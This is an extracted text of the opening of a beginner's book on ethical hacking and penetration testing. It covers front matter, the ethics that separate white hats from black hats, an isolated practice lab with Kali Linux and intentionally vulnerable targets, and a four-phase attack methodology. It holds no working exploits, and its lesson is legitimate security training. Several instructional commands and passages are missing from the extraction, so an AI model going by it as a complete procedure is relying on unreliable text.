The Basics of Hacking
and Penetration Testing
[Word Count: 7]

The Basics of Hacking
and Penetration Testing
[Word Count: 7]

Ethical Hacking and Penetration
Testing Made Easy
[Word Count: 7]

AMSTERDAM  BOSTON  HEIDELBERG  LONDON  NEW YORK
OXFORD  PARIS  SAN DIEGO  SAN FRANCISCO  SYDNEY  TOKYO
Syngress is an imprint of Elsevier
[Word Count: 29]

Acquiring Editor: Chris Katsaropoulos
Editorial Project Manager: Benjamin Rearick
Project Manager: Priya Kumaraguruparan
Designer: Mark Rogers
[Word Count: 16]

Syngress is an imprint of Elsevier
225 Wyman Street, Waltham, MA 02451, USA
[Word Count: 13]

Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 9]

No part of this publication may be reproduced or transmitted in any form or by any means, electronic or mechanical,
including photocopying, recording, or any information storage and retrieval system, without permission in writing
from the publisher. Details on how to seek permission, further information about the Publisher’s permissions policies
and our arrangements with organizations such as the Copyright Clearance Center and the Copyright Licensing Agency,
can be found at our website: www.elsevier.com/permissions.
[Word Count: 73]

This book and the individual contributions contained in it are protected under copyright by the Publisher (other than as
may be noted herein).
[Word Count: 23]

Notices
Knowledge and best practice in this ﬁeld are constantly changing. As new research and experience broaden
our understanding, changes in research methods or professional practices, may become necessary. Practitioners and
researchers must always rely on their own experience and knowledge in evaluating and using any information or
methods described herein. In using such information or methods they should be mindful of their own safety and the
safety of others, including parties for whom they have a professional responsibility.
[Word Count: 79]

To the fullest extent of the law, neither the Publisher nor the authors, contributors, or editors, assume any liability for
any injury and/or damage to persons or property as a matter of products liability, negligence or otherwise, or from any
use or operation of any methods, products, instructions, or ideas contained in the material herein.
[Word Count: 55]

Library of Congress Cataloging-in-Publication Data
Engebretson, Pat (Patrick Henry), 1974-
The basics of hacking and penetration testing : ethical hacking and penetration testing made easy /
Patrick Engebretson. e Second edition.
pages cm
Includes bibliographical references and index.
ISBN 978-0-12-411644-3
1. Penetration testing (Computer security) 2. Computer hackers. 3. Computer softwareeTesting. 4. Computer
crimesePrevention. I. Title.
QA76.9.A25E5443 2013
005.8edc23
2013017241
[Word Count: 60]

British Library Cataloguing-in-Publication Data
A catalogue record for this book is available from the British Library.
[Word Count: 16]

For information on all Syngress publications,
visit our website at www.syngress.com.
[Word Count: 11]

Printed in the United States of America
13 14 15 10 9 8 7 6 5 4 3 2 1
[Word Count: 20]

This book is dedicated to God and my family. Time to make like Zac Brown and
get Knee Deep.
v
[Word Count: 20]

ACKNOWLEDGMENTS .............................................................................ix
ABOUT THE AUTHOR...............................................................................xi
INTRODUCTION..................................................................................... xiii
[Word Count: 7]

CHAPTER 1 What is Penetration Testing? .............................................. 1
CHAPTER 2 Reconnaissance................................................................ 19
CHAPTER 3 Scanning .......................................................................... 53
CHAPTER 4 Exploitation ...................................................................... 79
CHAPTER 5 Social Engineering .......................................................... 127
CHAPTER 6 Web-Based Exploitation .................................................. 141
CHAPTER 7 Post Exploitation and Maintaining Access
with Backdoors, Rootkits, and Meterpreter...................... 167
CHAPTER 8 Wrapping Up the Penetration Test ................................... 187
[Word Count: 56]

INDEX ................................................................................................ 199
[Word Count: 3]

Thank you to everyone involved in making this second edition possible.
Publishing a book is a team effort and I have been blessed to be surrounded by
great teammates. The list below is woefully inadequate, so I apologize in advance
and thank everyone who had a hand in making this book a reality. Special
thanks to:
[Word Count: 56]

MY WIFE
My rock, my lighthouse, my steel cables. Thank you for the encouragement,
belief, support, and willingness to become a “single mother” again while I
disappeared for hours and days to work on this second edition. As with so many
things in my life, I am certain that without you, this book would not have been.
More than anyone else, I owe this work to you. I love you.
[Word Count: 70]

I know that in many ways, this edition was harder for you than the ﬁrst because
you are now old enough to miss me when I am gone, but still too young to
understand why I do it. Someday, when you are older, I hope you pick up this
book and know that all that I do in my life is for you.
[Word Count: 63]

MY FAMILY
Thank you to my extended family for your love and support. An extra special
thank you to my mother Joyce, who once again served as my unofﬁcial editor
and has probably read this book more times than anyone else. Your quick
turnaround time and insights were invaluable.
[Word Count: 49]

What can I say to the last man who made me feel like an absolute idiot around
a computer? Thanks for taking the time and supporting my work. You have
become a great friend and I appreciate your help.
[Word Count: 39]

Thanks again for the opportunity! Thanks to the editing team, I appreciate all of
the hard work and dedication you gave this project. A special thanks to Chris
Katsaropoulos for all your efforts.
[Word Count: 33]

I would like to thank all the previous readers who sent in questions and cor-
rections. I have been sure to include these updates. Regardless of whether you are
picking this book up for the ﬁrst time or you are returning to pick up some
additional tools, I am conﬁdent that you will enjoy the new edition.
[Word Count: 57]

As I mentioned at the beginning of the ﬁrst edition, I suppose there are several
questions that may be running through your head as you contemplate reading
this book: Who is the intended audience for this book? How this book is dif-
ferent than book ‘x’ (insert your favorite title here)? Why should I buy it? What
exactly will I need to set up in order to follow along with the examples? Because
these are all fair questions and because I am asking you to spend your time and
cash, it is important to provide some answers to these questions.
[Word Count: 100]

In addition to the structural changes, several of the tools from the original book
have been removed and new ones have been added in their place including
ThreatAgent, DNS interrogation tools, the Nmap Scripting Engine, Social-
Engineer Toolkit, Armitage, Meterpreter, w3af, ZAP and more. Along with the
updated individual tools (as I mentioned), the book and examples work with
Kali Linux as well.
[Word Count: 63]

Last, I have updated the Zero Entry Hacking (ZEH) methodology to include Post
Exploitation activities, tools, and processes.
[Word Count: 18]

WHO IS THE INTENDED AUDIENCE FOR THIS BOOK?
[Word Count: 8]

This book is meant to be a very gentle yet thorough guide to the world of hacking
and penetration testing. It is speciﬁcally aimed at helping you master the basic
steps needed to complete a hack or penetration test without overwhelming you.
By the time you ﬁnish this book, you will have a solid understanding of the
penetration testing process and you will be comfortable with the basic tools
needed to complete the job.
[Word Count: 74]

To be clear, this book is aimed at people who are new to the world of hacking
and penetration testing, for those with little or no previous experience, for those
who are frustrated by the inability to see the big picture (how the various tools
and phases ﬁt together), for a person who wants to quickly get up-to-speed on
with the seminal tools and methods for penetration testing, or for anyone
looking to expand their knowledge of offensive security.
[Word Count: 79]

HOW IS THIS BOOK DIFFERENT FROM BOOK ‘X’?
[Word Count: 8]

Unfortunately, as a beginner trying to break into the security ﬁeld and learn the
basics of hacking, tackling one of these books can be both daunting and con-
fusing. This book is different from other publications in two ways. First, it is
meant for beginners; recall the concept of “zero entry”. If you have never
[Word Count: 55]

performed any type of hacking or you have used a few tools but are not quite
sure what to do next (or how to interpret the results of the tool), this book is for
you. The goal is not to bury you with details but to present a broad overview of
the entire ﬁeld. Ultimately this book is not designed to make you an expert on
every angle of penetration testing; however, it will get you up-to-speed by cov-
ering everything you need to know in order to tackle more advanced material.
[Word Count: 92]

Recall the goal of this book is to provide general knowledge that will allow you
to tackle advanced topics and books. Once you have a ﬁrm grasp of the basics,
you can always go back and learn the speciﬁc details and advanced features of
a tool. In addition, each chapter will end with a list of suggested tools and topics
that are outside the scope of this book but can be used for further study and to
advance your knowledge.
[Word Count: 80]

The use of a sequential and singular rolling example throughout the book will
help readers see the big picture and better comprehend how the various tools
and phases ﬁt together. This is different than many other books on the market
today, which often discuss various tools and attacks but fail to explain how those
tools can be effectively chained together. Presenting information in a way that
[Word Count: 66]

shows the user how to clearly move from one phase to another will provide
valuable experience and allow the reader to complete an entire penetration test
by simply following along with the examples in the book. This concept should
allow the reader to get a clear understanding of the fundamental knowledge
while learning how the various tools and phases connect.
[Word Count: 60]

WHY SHOULD I BUY THIS BOOK?
Even though the immediate answers to this question are highlighted in the
preceding sections, below you will ﬁnd a condensed list of reasons:
[Word Count: 29]

 You want to learn more about hacking and penetration testing but you are
unsure of where to start.
 You have dabbled in hacking and penetration testing but you are not sure
how all of the pieces ﬁt together.
 You want to learn more about the tools and processes that are used by hackers
and penetration testers to gain access to networks and systems.
 You are looking for a good place to start building offensive security
knowledge.
 You have been tasked with performing a security audit for your organization.
 You enjoy a challenge.
[Word Count: 98]

In the event that you cannot ﬁnd a copy of Windows to create a vulnerable target,
you can still participate and practice each phase by creating or downloading
a vulnerable version of Linux. Throughout this book, we will utilize an inten-
tionally vulnerable version of Ubuntu called “Metasploitable”. Metasploitable
makes for a perfect practice target and best-of-all is completely free. At the time
of this writing Metasploitable could be downloaded from Sourceforge at http://
sourceforge.net/projects/metasploitable/.
[Word Count: 75]

Throughout the book you will ﬁnd web links like the one above. Because the web is
constantly changing, many web addresses tend to be transient. If you ﬁnd one of the
referenced links does not work, try using Google to locate the resource.
[Word Count: 43]

We will discuss more details on setting up your own “hacking lab” in Chapter 1
but below you will ﬁnd a quick list of everything that you need to get yourself up
and running, so that you can follow along with all of the examples in the book:
[Word Count: 48]

 VMware Player or any software capable of running a virtual machine.
 A Kali Linux or BackTrack Linux virtual machine or a version of Linux to serve
as your attack machine.
 The Metaploitable virtual machine, or any unpatched version of Windows
(preferably Windows XP) to serve as your target.
[Word Count: 51]

n
Introduction to Kali and Backtrack Linux: Tools. Lots of Tools
[Word Count: 11]

n
Working with Your Attack Machine: Starting the Engine
[Word Count: 9]

n
Methodology: Phases of a Penetration Test
[Word Count: 7]

It is important to spend a few moments discussing the difference between
penetration testing and vulnerability assessment. Many people (and vendors) in
[Word Count: 22]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00001-7
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

the security community incorrectly use these terms interchangeably. A vulner-
ability assessment is the process of reviewing services and systems for potential
security issues, whereas a penetration test actually performs exploitation and
Proof of Concept (PoC) attacks to prove that a security issue exists. Penetration
tests go a step beyond vulnerability assessments by simulating hacker activity
and delivering live payloads. In this book, we will cover the process of vulner-
ability assessment as one of the steps utilized to complete a penetration test.
[Word Count: 83]

SETTING THE STAGE
Understanding all the various players and positions in the world of hacking and
penetration testing is central to comprehending the big picture. Let us start by
painting the picture with broad brush strokes. Please understand that the
following is a gross oversimpliﬁcation; however, it should help you see the
differences between the various groups of people involved.
[Word Count: 60]

It may help to consider the Star Wars universe where there are two sides of the
“force”: Jedis and Siths. Good vs Evil. Both sides have access to an incredible
power. One side uses its power to protect and serve, whereas the other side uses it
for personal gain and exploitation.
[Word Count: 51]

In the pen testing world, it is not uncommon to hear the terms “white hat” and
“black hat” to describe the Jedis and Siths. Throughout this book, the terms
“white hat”, “ethical hacker”, or “penetration tester” will be used interchange-
ably to describe the Jedis or good guys. The Siths will be referred to as “black
hats”, “crackers”, or “malicious attackers”.
[Word Count: 61]

It is important to note that ethical hackers complete many of the same activities
with many of the same tools as malicious attackers. In nearly every situation, an
[Word Count: 28]

The Basics of Hacking and Penetration Testing
2
[Word Count: 8]

ethical hacker should strive to act and think like a real black hat hacker. The
closer the penetration test simulates a real-world attack, the more value it pro-
vides to the customer paying for the penetration testing (PT).
[Word Count: 38]

Please note how the previous paragraph says “in nearly every situation”. Even
though white hats complete many of the same tasks with many of the same
tools, there is a world of difference between the two sides. At its core, these
differences can be boiled down to three key points: authorization, motivation,
and intent. It should be stressed that these points are not all inclusive, but they
can be useful in determining if an activity is ethical or not.
[Word Count: 79]

Finally, if the intent is to provide the organization a realistic attack simulation so
that the company can improve its security through early discovery and miti-
gation of vulnerabilities, the attacker should be considered a white hat. It is also
[Word Count: 40]

What is Penetration Testing?
CHAPTER 1
3
[Word Count: 7]

important to comprehend the critical nature of keeping PT ﬁndings conﬁdential.
Ethical hackers will never share sensitive information discovered during the
process of a penetration testing with anyone other than the client. However, if
the intent is to leverage information for personal proﬁt or gain, the attacker
should be considered a black hat.
[Word Count: 53]

INTRODUCTION TO KALI AND BACKTRACK LINUX:
TOOLS. LOTS OF TOOLS
A few years back, the open discussion or teaching of hacking techniques was
considered a bit taboo. Fortunately, times have changed and people are begin-
ning to understand the value of offensive security. Offensive security is now
being embraced by organizations regardless of size or industries. Governments
are also getting serious about offensive security. Many governments have gone
on record stating they are actively building and developing offensive security
capabilities.
[Word Count: 80]

The Basics of Hacking and Penetration Testing
4
[Word Count: 8]

Ultimately, penetration testing should play an important role in the overall
security of your organization. Just as policies, risk assessments, business conti-
nuity planning, and disaster recovery have become integral components in
keeping your organization safe and secure, penetration testing needs to be
included in your overall security plan as well. Penetration testing allows you to
view your organization through the eyes of the enemy. This process can lead to
many surprising discoveries and give you the time needed to patch your systems
before a real attacker can strike.
[Word Count: 89]

One of the great things about learning how to hack today is the plethora and
availability of good tools to perform your craft. Not only are the tools readily
available, but many of them are stable with several years of development behind
them. May be even more important to many of you is the fact that most of these
tools are available free of charge. For the purpose of this book, every tool covered
will be free.
[Word Count: 77]

It is one thing to know a tool is free. It is another to ﬁnd, compile, and install
each of the tools required to complete even a basic penetration test. Although
this process is quite simple on today’s modern Linux operating systems (OSs), it
can still be a bit daunting for newcomers. Most people who start are usually
more interested in learning how to use the tools than they are in searching the
vast corners of the Internet to locate and install tools.
[Word Count: 83]

To be fair, you really should learn how to manually compile and install software
on a Linux machine; or at the very least, you should become familiar with apt-get
(or the like).
[Word Count: 32]

Advanced Package Tool (APT) is a package management system. APT allows you to
quickly and easily install, update, and remove software from the command line. Aside
from its simplicity, one of the best things about APT is the fact that it automatically
resolves dependency issues for you. This means that if the package you are installing
requires additional software, APT will automatically locate and install the additional
software. This is a massive improvement over the old days of “dependency hell”.
[Word Count: 80]

What is Penetration Testing?
CHAPTER 1
5
[Word Count: 7]

Before the package is installed, you will be shown how much disk space will be used and
you will be asked if you want to continue. To install your new software, you can type “Y” and
hit the enter key. When the program is done installing you will be returned to the # prompt.
At this point you can start Paros by entering the following command into the terminal:
[Word Count: 69]

For now you can simply close the Paros program. The purpose of this demo was to cover
installing new software, not in running or using Paros.
[Word Count: 26]

If you prefer not to use the command line when installing software, there are several
Graphical User Interfaces (GUIs) available for interacting with APT. The most popular
graphical front end is currently aptitude. Additional package managers are outside the
scope of this book.
[Word Count: 43]

After reviewing the resulting names and descriptions, we would then proceed with the
apt-get install command.
[Word Count: 16]

Please note, if you are using Kali Linux, Paros will already be installed for you!
Even so, the apt-get install command is still a powerful tool for installing
software.
[Word Count: 29]

A basic understanding of Linux will be beneﬁcial and will pay you mountains of
dividendsin thelongrun.Forthepurpose ofthisbook,there willbenoassumption
thatyouhavepriorLinuxexperience,butdoyourselfafavorand commityourselfto
becoming a Linux guru someday. Take a class, read a book, or just explore on your
own.Trustme,youwillthankmelater.Ifyouare interestedinpenetrationtestingor
hacking, there is no way of getting around the need to know Linux.
[Word Count: 51]

Fortunately, the security community is a very active and very giving group. There
are several organizations that have worked tirelessly to create various security-
speciﬁc Linux distributions. A distribution, or “distro” for short, is basically
a ﬂavor, type, or brand of Linux.
[Word Count: 42]

Among the most well known of these penetration testing distributions is one
called “Backtrack”. Backtrack Linux is your one-stop shop for learning hacking
and performing penetration testing. Backtrack Linux reminds me of a scene from
the ﬁrst Matrix movie where Tank asks Neo “What do you need besides a mira-
cle?” Neo responds with “Guns. Lots of Guns”. At this point in the movie, rows
[Word Count: 65]

The Basics of Hacking and Penetration Testing
6
[Word Count: 8]

and rows of guns slide into view. Every gun imaginable is available for Neo and
Trinity: handguns, riﬂes, shotguns, semiautomatic, automatic, big and small
from pistols to explosives, an endless supply of different weapons from which to
choose. That is a similar experience most newcomers have when they ﬁrst boot
up Backtrack or Kali Linux. “Tools. Lots of Tools”.
[Word Count: 59]

Backtrack Linux and Kali Linux are a security tester’s dream come true. These
distributions are built from the ground up for penetration testers. They come
preloaded with hundreds of security tools that are installed, conﬁgured, and
ready to be used. Best of all, Kali and Backtrack are free! You can get your copy of
Backtrack at http://www.Backtrack-linux.org/downloads/.
[Word Count: 57]

If you choose to download the VMware image, you will also need software
capable of opening and deploying or running the image. Luckily enough, there
are several good tools for accomplishing this task. Depending on your prefer-
ence, you can use VMware’s VMware Player, Sun Microsystem’s VirtualBox, or
Microsoft’s Virtual PC. In reality, if you do not like any of those options, there are
many other software options capable of running a virtual machine (VM) image.
You simply need to choose one that you are comfortable with.
[Word Count: 87]

Each of the three virtualization options listed above is available free of charge
and will provide you with the ability to run VM images. You will need to decide
which version is best for you. This book will rely heavily on the use of
[Word Count: 44]

What is Penetration Testing?
CHAPTER 1
7
[Word Count: 7]

a Backtrack VMware image and VMware Player. At the time of writing, VMware
Player was available at http://www.vmware.com/products/player/. You may
need to register for an account to download the software, but the registration
process is simple and free.
[Word Count: 38]

If you are unsure if you should use a live DVD or VM, it is suggested that you go
the VM route. Not only is this another good technology to learn, but using VMs
will allow you to set up an entire penetration testing lab on a single machine. If
that machine is a laptop, you essentially have a “travelling” PT lab so you can
practice your skills anytime, anywhere.
[Word Count: 70]

Kali Linux works in much the same way. You need to choose between down-
loading an ISO and burning it to DVD or downloading a preconﬁgured VMware
image. Regardless of which version you selected, you can simply accept the
default option (by hitting the Enter key) when presented with the Kali Linux
GRUB bootloader boot menu.
[Word Count: 56]

FIGURE 1.1
A screenshot showing the boot options when using the live DVD.
[Word Count: 13]

The Basics of Hacking and Penetration Testing
8
[Word Count: 8]

WORKING WITH YOUR ATTACK MACHINE: STARTING
THE ENGINE
[Word Count: 8]

Regardless of whether you choose to run Kali or Backtrack as either a VM or Live
DVD, once the initial system is loaded you will be presented with a login
prompt. The default user name is root and the default password is toor.
[Word Count: 43]

After typing this command and hitting the Enter key, X will begin to load. This
environment should seem vaguely familiar to most computer users. Once it has
completely loaded, you will see a desktop, icons, a taskbar, and a system tray. Just
like Microsoft Windows, you can interact with these items by moving your
mouse cursor and clicking on the desired object. If you are utilizing Kali Linux,
after logging in with the default root/toor user name and password you will be
automatically loaded to the GUI-based Gnome desktop environment.
[Word Count: 90]

Most of the programs we will use in this book will be run from the terminal.
There are several ways to start the terminal. In most Linux distributions, you can
use the keyboard shortcut: Ctrl þ Alt þ T. Many systems also include an icon
represented by a black box with a: >_ inside of it. This is often located in the
[Word Count: 62]

FIGURE 1.2
The icon to launch a terminal window.
[Word Count: 9]

What is Penetration Testing?
CHAPTER 1
9
[Word Count: 7]

taskbar or menu of the system. Figure 1.2 highlights the terminal shortcut for the
Gnome desktop.
[Word Count: 16]

Unlike Microsoft Windows or many of the modern-day Linux OS’s, by default,
some versions of Backtrack do not come with networking enabled. This setup is
by design. As a penetration tester, we often try to maintain a stealthy or unde-
tected presence. Nothing screams “Look at Me!! Look at Me!! I’m Here!!!” like
a computer that starts up and instantly begins spewing network trafﬁc by
broadcasting requests for a Dynamic Host Conﬁguration Protocol (DHCP)
server and Internet protocol (IP) address. To avoid this issue, the networking
interfaces of your Backtrack machine may be turned down (off) by default.
[Word Count: 98]

The easiest way to enable networking is through the terminal. Open a terminal
window by clicking on the terminal icon as shown in Figure 1.2 or (if you are
using Backtrack) by using the keyboard shortcut Ctrl þ Alt þ T. Once the
terminal opens, enter the following command:
[Word Count: 49]

This command will list all the available interfaces for your machine. At the
minimum, most machines will include an eth0 and a lo interface. The “lo”
interface is your loopback interface. The “eth0” is your ﬁrst Ethernet card.
Depending on your hardware, you may have additional interfaces or different
interface numbers listed. If you are running Backtrack through a VM, your main
interface will usually be eth0.
[Word Count: 67]

To turn the network card on, you enter the following command into a terminal
window:
[Word Count: 15]

Let us examine this command in more detail; “ifconﬁg” is a Linux command
that means “I want to conﬁgure a network interface”. As we already know, “eth0”
is the ﬁrst network device on our system (remember computers often start
counting at 0 not 1), and the keyword “up” is used to activate the interface. So we
can roughly translate the command you entered as “I want to conﬁgure the ﬁrst
interface to be turned on”.
[Word Count: 75]

Now that the interface is turned on, we need to get an IP address. There are two
basic ways to complete this task. Our ﬁrst option is to assign the address man-
ually by appending the desired IP address to the end of the previous command.
For example, if we wanted to assign our network card, an IP address of
192.168.1.23, we would type (assuming your interface is “eth0”):
[Word Count: 69]

At this point, the machine will have an IP address but will still need a gateway
and Domain Name System (DNS) server. A simple Google search for “setting up
network interface card (NIC) Linux” will show you how to enter that informa-
tion. You can always check to see if your commands worked by issuing the
following command into a terminal window:
[Word Count: 62]

The Basics of Hacking and Penetration Testing
10
[Word Count: 8]

Running this will allow you to see the current settings for your network in-
terfaces. Because this is a beginner’s guide and for the sake of simplicity, we will
assume that stealth is not a concern at the moment. In that case, the easiest way
to get an address is to use DHCP. To assign an address through DHCP, you
simply issue the command:
[Word Count: 64]

Please note, dhclient will attempt to automatically assign an IP address to your
NIC and conﬁgure all required settings including DNS and Gateway informa-
tion. If you are running Kali or Backtrack Linux from VMware Player, the
VMware software will act as the DHCP server.
[Word Count: 45]

Regardless of whether you used DHCP or statically assigned an address to your
machine, your machine should now have an IP address. If you are using Kali
Linux, your networking should be preconﬁgured. However, if you have any is-
sues the preceding section will be helpful. The last thing to address is how to turn
off Backtrack or Kali. As with most things in Linux, there are multiple ways to
accomplish this task. One of the easiest ways is to enter the following command
into a terminal window:
[Word Count: 88]

It is always a good idea to poweroff or reboot your attacking machine when you are done
running a pen test. You can also run the command “shutdown” or “shutdown now”
command to poweroff your machine. This good habit prevents you from accidently leaving
a tool running or inadvertently sending trafﬁc from your network while you are away from
your machine.
[Word Count: 61]

You can also substitute the poweroff command with the reboot command if you
would prefer to restart the system rather than shut it down.
[Word Count: 24]

Before proceeding, you should take several minutes to review and practice all the
steps discussed thus far including the following:
[Word Count: 20]

n
Login with the default user name and password
[Word Count: 9]

n
Start X (the Windows GUI) if you are using Backtrack
[Word Count: 11]

n
View all the network interfaces on your machine
[Word Count: 9]

n
Turn up (on) the desired network interface
[Word Count: 8]

n
Reboot the machine using the command line interface
[Word Count: 9]

n
Poweroff the machine using the command line interface.
[Word Count: 9]

What is Penetration Testing?
CHAPTER 1
11
[Word Count: 7]

The proper use and setup of a hacking lab is vital because one of the most
effective means to learn something is by doing that thing. Learning and mas-
tering the basics of penetration testing is no different.
[Word Count: 38]

The simplest and most effective way to create a sandboxed or isolated envi-
ronment is to physically unplug or disconnect your network from the Internet. If
you are using physical machines, it is best to rely on hardwired Ethernet cables
and switches to route trafﬁc. Also be sure to double- and triple-check that all
your wireless NICs are turned off. Always carefully inspect and review your
network for potential leaks before continuing.
[Word Count: 72]

The Basics of Hacking and Penetration Testing
12
[Word Count: 8]

Another beneﬁt of using VMs in your pen testing lab is the fact that it is very
simple to sandbox your entire system. Simply turn off the wireless card and
unplug the cable from the Internet. As long as you assigned addresses to the
network cards like we covered in the previous section, your physical machine
and VMs will still be able to communicate with each other and you can be
certain that no attack trafﬁc will leave your physical machine.
[Word Count: 81]

In general, penetration testing is a destructive process. Many of the tools and
exploits we run can cause damage or take systems ofﬂine. In some cases, it is
easier to reinstall the OS or program rather than attempt to repair it. This is
another area where VMs shine. Rather than having to physically reinstall a pro-
gram like SQL server or even an entire OS, the VM can be quickly reset or
restored to its original conﬁguration.
[Word Count: 77]

In order to follow along with each of the examples in this book you will need
access to the three VMs:
[Word Count: 21]

n
Kali or Backtrack Linux: the screenshots, examples, and paths in this book are
taken from Kali Linux but Backtrack 5 (and any previous edition) will work
as well. If you are using Backtrack 5, you will need to locate the proper path
for the tool being discussed. With Backtrack most tools can be located by
navigating the Applications / Backtrack menu on the desktop or by using
the terminal and moving into the/pen test directory. Regardless of whether
you choose Backtrack or Kali, this VM will serve as your attacker machine
for each exercise.
[Word Count: 95]

n
Metasploitable: Metasploitable is a Linux VM which was created in an inten-
tionally insecure manner. Metasploitable is available for free from Source-
Forge at http://sourceforge.net/projects/metasploitable/. Metasploitable will
serve as one of our targets when we cover exploitation.
[Word Count: 38]

n
Windows XP: while most of the exercises in this book will run against Meta-
sploitable, Windows XP (preferably with no service packs installed) will also
be used as a target throughout the book. With its wide deployment base and
past popularity, most people have little trouble getting a valid copy of Win-
dows XP. A default installation of Windows XP makes an excellent target for
learning hacking and penetration testing techniques.
[Word Count: 72]

For the duration of this book, each of the systems listed above will be
deployed as a VM on a single laptop. Networking will be conﬁgured so that all
machines belong to the same subnet and are capable of communicating with
each other.
[Word Count: 43]

Even if you cannot get your hands on a Windows XP VM, you can still follow along with
many of the examples in this book by utilizing Metasploitable. Another option is to simply
make a second copy of Backtrack (or Kali). If you use two copies of your attack machine,
one can serve as the attacker and one as the target.
[Word Count: 61]

What is Penetration Testing?
CHAPTER 1
13
[Word Count: 7]

Like most things, the overall process of penetration testing can be broken down
into a series of steps or phases. When put together, these steps form a compre-
hensive methodology for completing a penetration test. Careful review of un-
classiﬁed incident response reports or breech disclosures supports the idea that
most black hat hackers also follow a process when attacking a target. The use of
an organized approach is important because it not only keeps the penetration
tester focused and moving forward, but also allows the results or output from
each step to be used in the ensuing steps.
[Word Count: 99]

To keep things simple, we will use a four-step process to explore and learn
penetration testing. If you search around and examine other methodologies
(which is important to do), you may ﬁnd processes that include more or less
steps than we are using as well as different names for each of the phases. It is
important to understand that although the speciﬁc terminology may differ, most
solid penetration testing methodologies cover the same topics.
[Word Count: 74]

There is one exception to this rule: the ﬁnal step in many hacking methodologies
is a phase called “hiding”, “covering your tracks”, or “removing evidence”.
Because this book focuses on understanding the basics, it will not be included in
this methodology. Once you have a solid understanding of the basics, you can go
on to explore and learn more about this phase.
[Word Count: 62]

The remainder of this book will be dedicated to reviewing and teaching the
following steps: Reconnaissance, Scanning, Exploitation, and Post Exploitation
(or Maintaining Access). Sometimes, it helps to visualize these steps as an
inverted triangle. Figure 1.3 demonstrates this approach. The reason we use an
inverted triangle is because the outcome of initial phases is very broad. As we
move down into each phase, we continue to drill down to very speciﬁc details.
[Word Count: 73]

The inverted triangle works well because it represents our journey from the
broad to the speciﬁc. For example, as we work through the reconnaissance
phase, it is important to cast our nets as wide as possible. Every detail and every
piece of information about our target is collected and stored. The penetration
testing world is full of many great examples when a seemingly trivial piece of
[Word Count: 66]

The Basics of Hacking and Penetration Testing
14
[Word Count: 8]

However, because this book covers the basics, we will discuss vulnerability scanners and
their proper use in the Zero Entry Hacking methodology.
[Word Count: 22]

It is also important to understand the order of each step. The order in which we
conduct the steps is very important because the result or output of one step often
needs to be used in the step below it. You need to understand more than just
how to simply run the security tools in this book. Understanding the proper
sequence in which they are run is vital to performing a comprehensive and
realistic penetration test.
[Word Count: 76]

For example, many newcomers skip the Reconnaissance phase and go straight to
exploiting their target. Not completing steps 1 and 2 will leave you with
[Word Count: 25]

FIGURE 1.3
Zero entry hacking penetration testing methodology.
[Word Count: 8]

What is Penetration Testing?
CHAPTER 1
15
[Word Count: 7]

a signiﬁcantly smaller target list and attack vector on each target. In other words,
you become a one-trick-pony. Although knowing how to use a single tool might
be impressive to your friends and family, it is not to the security community and
professionals who take their job seriously.
[Word Count: 48]

Let us brieﬂy review each of the four steps that will be covered so you have a solid
understanding of them. The ﬁrst step in any penetration test is “reconnaissance”.
This phase deals with information gathering about the target. As was mentioned
previously, the more information you collect on your target, the more likely you
are to succeed in later steps. Reconnaissance will be discussed in detail in
Chapter 2.
[Word Count: 70]

FIGURE 1.4
Cyclical representation of the ZEH methodology; zero entry hacking: a four-step model.
[Word Count: 14]

The Basics of Hacking and Penetration Testing
16
[Word Count: 8]

Exploitation can occur locally or remotely. Local exploitation requires the attacker to have
physical access to the computer while remote exploitation occurs through networks and
systems when the attacker cannot physically touch the target. This book will cover both
local and remote attacks. Regardless of whether the attack is local or remote, full
administrative access usually remains the deﬁnitive goal. Administrative access allows
a hacker to fully and completely control the target machine. New programs can be
installed, defensive tools can be disabled, conﬁdential documents can be copied, edited,
or deleted, security settings can be changed and much more.
[Word Count: 99]

What is Penetration Testing?
CHAPTER 1
17
[Word Count: 7]

The Penetration Testing Execution Standard (PTES) is a fantastic resource if you are
looking to ﬁnd a more in-depth and thorough methodology. The PTES includes both
technical guidelines which can be used by security professionals as well as a framework
and common language that can be leveraged by the business community. You can ﬁnd
more information at http://www.pentest-standard.org.
[Word Count: 58]

The Basics of Hacking and Penetration Testing
18
[Word Count: 8]

n
Google Directives: Practicing Your Google-Fu
[Word Count: 6]

n
The Harvester: Discovering and Leveraging E-mail Addresses
[Word Count: 8]

n
Fierce and Other Tools to Extract Information from DNS
[Word Count: 10]

n
Extracting Information From E-mail Servers
[Word Count: 6]

n
Sifting through the Intel to Finding Attackable Targets
[Word Count: 9]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00002-9
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

In most cases, people who attend hacking workshops or classes have a basic
understanding of a few security tools. Typically, these students have used a port
scanner to examine a system or maybe they have used Wireshark to examine
network trafﬁc. Some have even played around with exploit tools like Metasploit.
Unfortunately, most beginners do not understand how these tools ﬁt into the
grand scheme of a penetration test. As a result, their knowledge is incomplete.
Following a methodology ensures that you have a plan and know what to do next.
[Word Count: 91]

To stress the importance of using and following a methodology, it is often
beneﬁcial to describe a scenario that helps demonstrate both the importance of
this step and the value of following a complete methodology when conducting
a penetration test.
[Word Count: 40]

The ﬁrst step in every job is research. The more thoroughly you prepare for
a task, the more likely you are to succeed. The guys who created Backtrack and
Kali Linux are fond of quoting Abraham Lincoln who said, “If I had 6 h to chop
down a tree, I’d spend the ﬁrst four of them sharpening my axe.” This is a perfect
introduction to both penetration testing and the reconnaissance phase.
[Word Count: 72]

Reconnaissance, also known as information gathering, is arguably the most
important of the four phases we will discuss. The more time you spend collecting
information on your target, the more likely you are to be successful in the later
phases. Ironically, recon is also one of the most overlooked, underutilized, and
misunderstood steps in penetration testing (PT) methodologies today.
[Word Count: 59]

It is possible that this phase is overlooked because newcomers are never formally
introduced to the concept, its rewards, or how the results of good information
gathering can be vital in later steps. It is also possible that this phase is over-
looked because it is the least “technical” and often the least exciting. Oftentimes,
people who are new to hacking tend to view this phase as boring and unchal-
lenging. Nothing could be further from the truth.
[Word Count: 78]

Although it is true that there are very few good, automated tools that can be used
to complete recon, once you understand the basics it is like an entirely new way
of looking at the world. A good information gatherer is made up of equal parts:
hacker, social engineer, and private investigator. The absence of well-deﬁned
rules of engagement also distinguishes this phase from all others. This is in
stark contrast to the remaining steps in our methodology. For example, when we
[Word Count: 82]

